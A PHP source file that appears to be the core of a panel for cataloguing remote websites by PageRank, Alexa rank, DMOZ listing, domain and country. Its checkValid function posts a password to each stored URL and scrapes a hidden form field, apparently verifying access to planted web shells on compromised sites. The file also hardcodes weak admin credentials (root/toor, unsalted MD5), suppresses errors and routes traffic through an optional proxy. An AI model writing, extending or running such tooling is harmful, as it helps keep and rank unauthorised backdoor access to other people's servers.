<?php
#GEOIP
include('geoip/geoip.php');

#CONFIG
define('CAN_RUN', 1 );
define('ROOT_DIR', @getcwd() . '/' );
define('ADMIN_NAME', 'root');
define('ADMIN_HASH', md5('toor'));
define('USER_AGENT', 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20120427 Firefox/15.0a1');
define('CHECK_BEFORE', true);
define('MODE', 'FULL');
define('DB_FILE', 'db.php' );
define('DEBUG', false );

if(DEBUG)
	error_reporting(E_ALL);
else
@date_default_timezone_set('Europe/Moscow');
@error_reporting(0);
@session_start();
@set_time_limit(0);
function stripslashes_array($array) {
	return is_array($array) ? array_map('stripslashes_array', $array) : stripslashes($array);
}
if( get_magic_quotes_gpc() )
	$_POST = stripslashes_array($_POST);

if( ($_SERVER['REQUEST_METHOD'] == 'POST') && !empty($_SERVER['HTTP_REFERER']) )
	if(!preg_match('!^http(s)?://' . preg_quote($_SERVER['HTTP_HOST']) . '!i', @$_SERVER['HTTP_REFERER']))
		die('Referer check error');

if(!empty($_POST['login']) && !empty($_POST['pass'])) {
	$_SESSION['login'] = $_POST['login'];
	$_SESSION['hash'] = md5($_POST['pass']);
}
if( (basename($_SERVER['REQUEST_URI']) != "login.php") && ((@$_SESSION['login'] != ADMIN_NAME) || (@$_SESSION['hash'] != ADMIN_HASH)) ) {
	header('Location: login.php');
	exit;
}

if(!file_exists(DB_FILE)) {
	if(is_writeable('./')) {
		file_put_contents(DB_FILE, '<?php exit; ?>');
	} else {
		die("Can't create " . DB_FILE);
	}
}
if(!is_readable(DB_FILE)) {
	die(DB_FILE . ' is not readable');
}
if(!is_writable(DB_FILE)) {
	die(DB_FILE . ' is not writable');
}

function read_db() {
	$content = str_replace('<?php exit; ?>', '', file_get_contents(DB_FILE));
	$GLOBALS['database'] = @unserialize($content);

}
function save_db() {
	file_put_contents(DB_FILE, '<?php exit; ?>' . serialize($GLOBALS['database']));
}
function page_reload() {
?>
<script>
	location.href = '<?=htmlspecialchars($_SERVER['PHP_SELF']);?>';
</script>
<?php
}
#DMOZ
function getdmoz($url){
$opts = array(
  'http'=>array(
    'method'=>"GET",
	'proxy'=>(defined('PROXY'))?('tcp://' . PROXY):null,
    'header'=>"Accept-language: en\r\n" .
              "Cookie: foo=bar\r\n"
  )
);
	$context  = stream_context_create($opts);
	$rez=@file_get_contents('http://www.dmoz.org/search/?q='.$url, false, $context);
	if(stristr($rez,'Open Directory Categories')){return '<font color=green>YES</font>';}
	else
	{return 'NO';}



}


#GETCONTENT
function get_content($url, $post) {
	$opts = array('http' =>
		array(
			'method'  => 'POST',
			'proxy' => (defined('PROXY'))?('tcp://' . PROXY):null,
			'user_agent'=>USER_AGENT,
			'header'  => 'Content-type: application/x-www-form-urlencoded',
			'content' => $post
		)
	);
	$context  = stream_context_create($opts);
	return @file_get_contents($url, false, $context);
}

#PR CHECKER
$GOOGLEHOST='toolbarqueries.google.com'; 
$USERAGENT='Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.6) Gecko/20060728 Firefox/1.5'; 
      

function StrToNum($Str, $Check, $Magic) { 
    $Int32Unit = 4294967296; 

    $length = strlen($Str); 
    for ($i = 0; $i < $length; $i++) { 
        $Check *= $Magic;      
        if ($Check >= $Int32Unit) { 
            $Check = ($Check - $Int32Unit * (int) ($Check / $Int32Unit)); 
            $Check = ($Check < -2147483648) ? ($Check + $Int32Unit) : $Check; 
        } 
        $Check += ord($Str{$i});  
    } 
    return $Check; 
} 

function HashURL($String) { 
    $Check1 = StrToNum($String, 0x1505, 0x21); 
    $Check2 = StrToNum($String, 0, 0x1003F); 

    $Check1 >>= 2;      
    $Check1 = (($Check1 >> 4) & 0x3FFFFC0 ) | ($Check1 & 0x3F); 
    $Check1 = (($Check1 >> 4) & 0x3FFC00 ) | ($Check1 & 0x3FF); 
    $Check1 = (($Check1 >> 4) & 0x3C000 ) | ($Check1 & 0x3FFF);     
     
    $T1 = (((($Check1 & 0x3C0) << 4) | ($Check1 & 0x3C)) <<2 ) | ($Check2 & 0xF0F ); 
    $T2 = (((($Check1 & 0xFFFFC000) << 4) | ($Check1 & 0x3C00)) << 0xA) | ($Check2 & 0xF0F0000 ); 
     
    return ($T1 | $T2); 
} 

function CheckHash($Hashnum) { 
    $CheckByte = 0; 
    $Flag = 0; 

    $HashStr = sprintf('%u', $Hashnum) ; 
    $length = strlen($HashStr); 
     
    for ($i = $length - 1;  $i >= 0;  $i --) { 
        $Re = $HashStr{$i}; 
        if (1 === ($Flag % 2)) {               
            $Re += $Re;      
            $Re = (int)($Re / 10) + ($Re % 10); 
        } 
        $CheckByte += $Re; 
        $Flag ++;     
    } 

    $CheckByte %= 10; 
    if (0 !== $CheckByte) { 
        $CheckByte = 10 - $CheckByte; 
        if (1 === ($Flag % 2) ) { 
            if (1 === ($CheckByte % 2)) { 
                $CheckByte += 9; 
            } 
            $CheckByte >>= 1; 
        } 
    } 

    return '7'.$CheckByte.$HashStr; 
} 

function getch($url) { return CheckHash(HashURL($url)); } 

function getpr($url) { 
    global $GOOGLEHOST,$USERAGENT; 
    $chh = getch($url); 
    $fp = fsockopen($GOOGLEHOST, 80, $errno, $errstr, 30); 
                if ($fp)
                { 
                $out = "GET /tbr?features=Rank&sourceid=navclient-ff&client=navclient-auto-ff&ch=$chh&q=info:$url HTTP/1.1\r\n"; 
                $out .= "User-Agent: $USERAGENT\r\n"; 
                $out .= "Host: $GOOGLEHOST\r\n"; 
                $out .= "Connection: Close\r\n\r\n"; 
     
                fwrite($fp, $out); 
                        while (!feof($fp))
                        {
            $data = fgets($fp, 128); 
            $pos = strpos($data, "Rank_"); 
                                if($pos === false)
                                {}
                                else
                                { 
                $gpr=substr($data, $pos + 9); 
                $gpr=trim($gpr); 
                $gpr=str_replace("\n",'',$gpr); 
                                if (isset($gpr)) $pr=$gpr;
                        } 
               }
                if (!isset($pr)) $pr=0;
				if($pr>=5) $pr='<font color=green><b>'.$pr.'</b></font>';
                return $pr;
                fclose($fp); 
                } 
				
				
} 


#Alexa
function getAlexaRank($domain)
 {
     $url = 'http://data.alexa.com/data?cli=10&dat=snbamz&url=' . trim($domain);
     $xmldata = simplexml_load_file($url);
     if(isset($xmldata->SD[1]->POPULARITY['TEXT'])){
           return number_format((string)$xmldata->SD[1]->POPULARITY['TEXT']);
     }
     else
    {
          return 0;
    }
 }


#Country
function getCountry($url)
	{
	    $ip=gethostbyname($url);
		$gi = geoip_open("geoip/geoip.dat", GEOIP_STANDARD);
		$code = geoip_country_code_by_addr1($gi, $ip);
		if (strlen(trim($code)) < 2) {
		    geoip_close($gi);
			return $code = "N/A";
		}else{
		geoip_close($gi);
		return '<img src=img/flags/'.$code.'.gif> <font color="black"><b>'.$code.'</b></font>';
		}
	} 

#Graphs
function arConvert($database){
     $l = array();
	 $h = array();
	 $m = array();
     foreach ($database as $k=>$v){
	    $int = str_replace(',','',$database[$k]['alexa']);
		if($int > 1000000 || $int == 0){$h[] = $k;}
		if($int < 1000000 && $int > 100000){$m[] = $k;}
		if($int < 100000){$l[] = $k;}
	 }
	 
	 return '[[ 
	 ["Alexa < 100K",'.count($l).'],
	 ["100K < Alexa < 1M",'.count($m).'],
	 ["Alexa > 1M",'.count($h).'] 
	 ]]';
	 
	 }

	 
function dzConvert($database){
     $fd = array();
	 $others = array();
     $dz = array('.com','.org','.net','.edu','.de','.fr','.it','.ca','.au','.ru');
	 foreach ($database as $k=>$v){
	    if(preg_match('#'.implode("|",$dz).'#i',$database[$k]['url'],$match)){
		   $fd[$match[0]][] = $k;
		   }
		else{
           $others[] = $k;		
	       }
	 }
	 
	 return '[[ 
	 [".com",'.count($fd['.com']).'],
	 [".org",'.count($fd['.org']).'],
	 [".net",'.count($fd['.net']).'],
	 [".edu",'.count($fd['.edu']).'],
	 [".de",'.count($fd['.de']).'],
	 [".fr",'.count($fd['.fr']).'],
	 [".it",'.count($fd['.it']).'],
	 [".ca",'.count($fd['.ca']).'],
	 [".au",'.count($fd['.au']).'],
	 [".ru",'.count($fd['.ru']).'],
	 ["others",'.count($others).'],
	 ]]';
	 
	 }
	 
function checkValid($url,$pass){
$opts = array('http' =>
		array(
			'method'  => 'POST',
			'proxy' => (defined('PROXY'))?('tcp://' . PROXY):null,
			'user_agent'=>USER_AGENT,
			'header'  => 'Content-type: application/x-www-form-urlencoded',
			'content' => http_build_query(
				array(
					'pass' => $pass,
				)
		)));
	$context  = stream_context_create($opts);
	preg_match('#(?<=name\=c value\=\').*(?=\'\>)#i',@file_get_contents($url, false, $context),$matches);			
	return $matches[0];		
			
}	 
	 
	 
	 
read_db();
?>